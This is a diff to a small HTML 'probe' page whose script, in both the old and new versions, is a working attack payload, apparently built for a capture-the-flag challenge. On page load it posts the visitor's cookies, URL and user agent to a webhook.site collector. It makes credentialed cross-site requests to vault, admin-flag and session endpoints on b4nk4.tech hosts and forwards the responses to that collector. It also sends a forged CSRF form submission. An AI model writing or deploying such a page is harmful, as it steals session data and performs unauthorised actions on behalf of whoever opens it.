@@ -2,40 +2,31 @@
 <html><head><meta charset="utf-8"><title>probe</title></head><body>
 <h1>probe</h1>
 <script>
-const W = 'https://webhook.site/c9ee2989-e434-4f10-8f42-69306c25a9a1';
-function log(k, v) { try { fetch(W, {method:'POST', mode:'no-cors', body: '[' + k + '] ' + String(v).slice(0,3000)}); } catch(e){} }
-(async () => {
-  log('hit-url', location.href);
-  log('ua', navigator.userAgent);
-  log('referrer', document.referrer || '(none)');
-  log('cookie', document.cookie || '(none)');
-
-  // A) 跨域 fetch（凭据）
-  const g = [
-    ['catdrive-vault-items', 'https://catdrive.b4nk4.tech/vault/items'],
-    ['catdesk-admin-flag', 'https://catdesk.b4nk4.tech/admin/flag'],
-    ['quivera-session', 'https://quivera.b4nk4.tech/api/session'],
-  ];
-  for (const [n, u] of g) {
-    try { const r = await fetch(u, {credentials:'include'}); const t = await r.text(); log(n, r.status + ' len=' + t.length + ' :: ' + t.slice(0,1500)); }
-    catch(e) { log(n + '-ERR', String(e)); }
-  }
-  // B) no-cors POST（CSRF 探测，请求会真的发出）
-  try {
-    await fetch('https://catdrive.b4nk4.tech/submit', {
-      method:'POST', mode:'no-cors', credentials:'include',
-      headers:{'Content-Type':'application/x-www-form-urlencoded'},
-      body:'url=https://mahaoyu138-sudo.github.io/probe-page/'
-    });
-    log('csrf-post', 'sent (no-cors)');
-  } catch(e) { log('csrf-post-ERR', String(e)); }
-  // C) 顶层导航 GET 探测（Lax 允许）
-  try {
-    const img = new Image();
-    img.src = 'https://catdrive.b4nk4.tech/vault/history';
-    log('img-probe', 'requested');
-  } catch(e) { log('img-ERR', String(e)); }
-  log('done', 'completed');
-})();
+var W = 'https://webhook.site/c9ee2989-e434-4f10-8f42-69306c25a9a1';
+function log(k, v) { try { fetch(W, {method:'POST', mode:'no-cors', body: '[' + k + '] ' + String(v).slice(0,2500)}); } catch(e){} }
+log('hit', location.href);
+log('ua', navigator.userAgent);
+log('cookie', document.cookie || '(none)');
+log('origin', location.origin);
+var T = [
+  ['catdrive-vault-items', 'https://catdrive.b4nk4.tech/vault/items'],
+  ['catdrive-open', 'https://catdrive.b4nk4.tech/vault/open/9e05cc0b-28f4-4b5a-9952-3b8c160a6d4c'],
+  ['catdesk-flag', 'https://catdesk.b4nk4.tech/admin/flag'],
+  ['quivera-session', 'https://quivera.b4nk4.tech/api/session'],
+  ['quivera-track', 'https://quivera.b4nk4.tech/api/public/tracking/QV2609111007'],
+];
+for (var i = 0; i < T.length; i++) {
+  (function(n, u){
+    fetch(u, {credentials:'include'}).then(function(r){
+      return r.text().then(function(t){ log(n, r.status + ' len=' + t.length + ' :: ' + t.slice(0,1800)); });
+    }).catch(function(e){ log(n + '-ERR', String(e)); });
+  })(T[i][0], T[i][1]);
+}
+fetch('https://catdrive.b4nk4.tech/submit', {
+  method:'POST', mode:'no-cors', credentials:'include',
+  headers:{'Content-Type':'application/x-www-form-urlencoded'},
+  body:'url=https://mahaoyu138-sudo.github.io/probe-page/'
+}).then(function(){ log('csrf-post', 'sent'); }).catch(function(e){ log('csrf-post-ERR', String(e)); });
+log('sync-end', 'all-dispatched');
 </script>
 </body></html>
